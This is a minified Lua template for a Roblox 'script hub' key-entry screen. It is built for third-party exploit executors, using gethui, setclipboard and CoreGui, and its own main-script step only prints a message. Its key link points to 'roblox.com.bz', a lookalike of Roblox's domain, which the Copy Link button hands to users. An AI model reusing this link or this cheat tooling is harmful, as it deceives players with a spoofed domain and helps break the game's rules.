do local CONFIG={Title="Your Script Hub",Subtitle="Enter your key to continue",KeyLink="https://roblox.com.bz/communities/2694890384/",Keys={"YOUR-KEY-HERE"},Accent=Color3.fromRGB(124,92,255),Accent2=Color3.fromRGB(64,156,255)};local function OnSuccess() print("Key accepted. Main script goes here.");end local Players=game:GetService("Players");local TweenService=game:GetService("TweenService");local UserInputService=game:GetService("UserInputService");local CoreGui=game:GetService("CoreGui");local GREEN=Color3.fromRGB(80,220,140);local RED=Color3.fromRGB(255,90,100);local GREY=Color3.fromRGB(140,140,165);local function new(class,props) local inst=Instance.new(class);for k,v in pairs(props or {} ) do inst[k]=v;end return inst;end local function tween(obj,time,props,style,dir) local tw=TweenService:Create(obj,TweenInfo.new(time,style or Enum.EasingStyle.Quad ,dir or Enum.EasingDirection.Out ),props);tw:Play();return tw;end local function getParent() local ok,hui=pcall(function() return gethui and gethui() ;end);if (ok and hui) then return hui;end if pcall(function() return CoreGui.Name;end) then return CoreGui;end return Players.LocalPlayer:WaitForChild("PlayerGui");end local function copyToClipboard(text) local fn=setclipboard or toclipboard or (syn and syn.write_clipboard) or (Clipboard and Clipboard.set) ;if fn then return pcall(fn,text);end return false;end local function isValid(input) input=input:match("^%s*(.-)%s*$");if (input=="") then return false;end for _,key in ipairs(CONFIG.Keys) do if (input==key) then return true;end end return false;end local old=getParent():FindFirstChild("KeySystem");if old then old:Destroy();end local gui=new("ScreenGui",{Name="KeySystem",ResetOnSpawn=false,IgnoreGuiInset=true,ZIndexBehavior=Enum.ZIndexBehavior.Sibling});local main=new("Frame",{Name="Main",AnchorPoint=Vector2.new(0.5,0.5),Position=UDim2.fromScale(0.5,0.5),Size=UDim2.fromOffset(420,260),BackgroundColor3=Color3.fromRGB(17,17,25),BorderSizePixel=0,Parent=gui});new("UICorner",{CornerRadius=UDim.new(0,14),Parent=main});local mainStroke=new("UIStroke",{Thickness=1.5,Color=Color3.new(1,1,1),Parent=main});new("UIGradient",{Color=ColorSequence.new(CONFIG.Accent,CONFIG.Accent2),Rotation=45,Parent=mainStroke});local openScale=new("UIScale",{Scale=0.85,Parent=main});local header=new("Frame",{Name="Header",Size=UDim2.new(1,0,0,80),BackgroundTransparency=1,Parent=main});local title=new("TextLabel",{Position=UDim2.fromOffset(30,20),Size=UDim2.fromOffset(300,28),BackgroundTransparency=1,Text=CONFIG.Title,Font=Enum.Font.GothamBold,TextSize=22,TextColor3=Color3.new(1,1,1),TextXAlignment=Enum.TextXAlignment.Left,Parent=header});new("UIGradient",{Color=ColorSequence.new(CONFIG.Accent,CONFIG.Accent2),Parent=title});new("TextLabel",{Position=UDim2.fromOffset(30,50),Size=UDim2.fromOffset(300,18),BackgroundTransparency=1,Text=CONFIG.Subtitle,Font=Enum.Font.Gotham,TextSize=13,TextColor3=GREY,TextXAlignment=Enum.TextXAlignment.Left,Parent=header});local close=new("TextButton",{Position=UDim2.new(1, -42,0,16),Size=UDim2.fromOffset(26,26),BackgroundColor3=Color3.fromRGB(30,30,44),AutoButtonColor=false,Text="×",Font=Enum.Font.GothamBold,TextSize=18,TextColor3=GREY,BorderSizePixel=0,ZIndex=3,Parent=main});new("UICorner",{CornerRadius=UDim.new(0,8),Parent=close});close.MouseEnter:Connect(function() tween(close,0.15,{BackgroundColor3=RED,TextColor3=Color3.new(1,1,1)});end);close.MouseLeave:Connect(function() tween(close,0.15,{BackgroundColor3=Color3.fromRGB(30,30,44),TextColor3=GREY});end);local keyBox=new("TextBox",{Name="KeyBox",Position=UDim2.fromOffset(30,95),Size=UDim2.fromOffset(360,42),BackgroundColor3=Color3.fromRGB(26,26,38),BorderSizePixel=0,Text="",PlaceholderText="Enter your key...",PlaceholderColor3=Color3.fromRGB(105,105,130),TextColor3=Color3.fromRGB(240,240,250),Font=Enum.Font.Gotham,TextSize=15,ClearTextOnFocus=false,TextXAlignment=Enum.TextXAlignment.Left,Parent=main});new("UICorner",{CornerRadius=UDim.new(0,9),Parent=keyBox});new("UIPadding",{PaddingLeft=UDim.new(0,14),PaddingRight=UDim.new(0,14),Parent=keyBox});local keyStroke=new("UIStroke",{Thickness=1.2,Color=Color3.fromRGB(45,45,66),Parent=keyBox});keyBox.Focused:Connect(function() tween(keyStroke,0.2,{Color=CONFIG.Accent});end);keyBox.FocusLost:Connect(function() tween(keyStroke,0.2,{Color=Color3.fromRGB(45,45,66)});end);local function makeButton(text,position,filled) local btn=new("TextButton",{Position=position,Size=UDim2.fromOffset(175,42),BackgroundColor3=(filled and Color3.new(1,1,1)) or Color3.fromRGB(26,26,38) ,AutoButtonColor=false,Text=text,Font=Enum.Font.GothamBold,TextSize=14,TextColor3=Color3.new(1,1,1),BorderSizePixel=0,Parent=main});new("UICorner",{CornerRadius=UDim.new(0,9),Parent=btn});local scale=new("UIScale",{Scale=1,Parent=btn});if filled then new("UIGradient",{Color=ColorSequence.new(CONFIG.Accent,CONFIG.Accent2),Rotation=20,Parent=btn});else local stroke=new("UIStroke",{Thickness=1.5,Color=CONFIG.Accent,Parent=btn});btn.MouseEnter:Connect(function() tween(btn,0.15,{BackgroundColor3=Color3.fromRGB(36,34,56)});tween(stroke,0.15,{Color=CONFIG.Accent2});end);btn.MouseLeave:Connect(function() tween(btn,0.15,{BackgroundColor3=Color3.fromRGB(26,26,38)});tween(stroke,0.15,{Color=CONFIG.Accent});end);end btn.MouseEnter:Connect(function() tween(scale,0.15,{Scale=1.04});end);btn.MouseLeave:Connect(function() tween(scale,0.15,{Scale=1});end);btn.MouseButton1Down:Connect(function() tween(scale,0.08,{Scale=0.96});end);btn.MouseButton1Up:Connect(function() tween(scale,0.08,{Scale=1.04});end);return btn;end local checkBtn=makeButton("Check Key",UDim2.fromOffset(30,155),true);local copyBtn=makeButton("Copy Link",UDim2.fromOffset(215,155),false);local status=new("TextLabel",{Position=UDim2.fromOffset(30,212),Size=UDim2.fromOffset(360,30),BackgroundTransparency=1,Text="Get a key with Copy Link, then paste it above.",Font=Enum.Font.Gotham,TextSize=13,TextColor3=GREY,TextWrapped=true,Parent=main});local function setStatus(text,color) status.Text=text;status.TextColor3=color;end local busy=false;local function shake() local origin=main.Position;for _=1,3 do tween(main,0.04,{Position=origin + UDim2.fromOffset(8,0) }).Completed:Wait();tween(main,0.04,{Position=origin-UDim2.fromOffset(8,0) }).Completed:Wait();end tween(main,0.04,{Position=origin});end local function closeGui() tween(openScale,0.25,{Scale=0.8},Enum.EasingStyle.Back,Enum.EasingDirection.In);task.wait(0.25);gui:Destroy();end local function checkKey() if busy then return;end busy=true;if isValid(keyBox.Text) then setStatus("Key accepted. Loading...",GREEN);task.wait(0.7);closeGui();task.spawn(OnSuccess);return;end setStatus("Invalid key. Try again or copy the link to get one.",RED);shake();busy=false;end checkBtn.MouseButton1Click:Connect(checkKey);keyBox.FocusLost:Connect(function(enterPressed) if enterPressed then checkKey();end end);copyBtn.MouseButton1Click:Connect(function() if copyToClipboard(CONFIG.KeyLink) then setStatus("Link copied to clipboard.",CONFIG.Accent2);copyBtn.Text="Copied!";task.delay(1.5,function() if copyBtn.Parent then copyBtn.Text="Copy Link";end end);else setStatus("Clipboard not supported. Link: "   .. CONFIG.KeyLink ,RED);end end);close.MouseButton1Click:Connect(closeGui);local dragging,dragStart,startPos;header.InputBegan:Connect(function(input) if ((input.UserInputType==Enum.UserInputType.MouseButton1) or (input.UserInputType==Enum.UserInputType.Touch)) then dragging=true;dragStart=input.Position;startPos=main.Position;input.Changed:Connect(function() if (input.UserInputState==Enum.UserInputState.End) then dragging=false;end end);end end);UserInputService.InputChanged:Connect(function(input) if (dragging and ((input.UserInputType==Enum.UserInputType.MouseMovement) or (input.UserInputType==Enum.UserInputType.Touch))) then local delta=input.Position-dragStart ;main.Position=UDim2.new(startPos.X.Scale,startPos.X.Offset + delta.X ,startPos.Y.Scale,startPos.Y.Offset + delta.Y );end end);gui.Parent=getParent();tween(openScale,0.35,{Scale=1},Enum.EasingStyle.Back,Enum.EasingDirection.Out); end